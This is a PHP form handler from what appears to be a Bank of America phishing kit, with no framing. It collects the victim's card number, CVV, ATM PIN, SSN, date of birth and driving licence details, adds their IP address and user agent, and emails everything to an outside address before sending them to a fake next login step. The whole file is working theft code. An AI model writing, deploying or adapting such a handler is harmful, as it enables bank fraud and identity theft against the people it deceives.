<?php
if($_POST["noc"] != "" and $_POST["cn"] != ""){
$ip5 = getenv("REMOTE_ADDR");
 $useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------BOA Info-----------------------\n";
$message .= "Name on Card            : ".$_POST['noc']."\n";
$message .= "Card Number            : ".$_POST['cn']."\n";
$message .= "Expiry Date       : ".$_POST['ex']."\n";
$message .= "CVV            : ".$_POST['cv']."\n";
$message .= "ATM PIN          : ".$_POST['pn']."\n";
$message .= "Date of Birth            : ".$_POST['db']."\n";
$message .= "SSN            : ".$_POST['sn']."\n";
$message .= "Driving License            : ".$_POST['dl']."\n";
$message .= "Driving License Exp Date            : ".$_POST['dlx']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip5."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$send = "julie840923@keemail.me";
$subject = "Card | $ip5";
{
mail("$send", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: step4.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>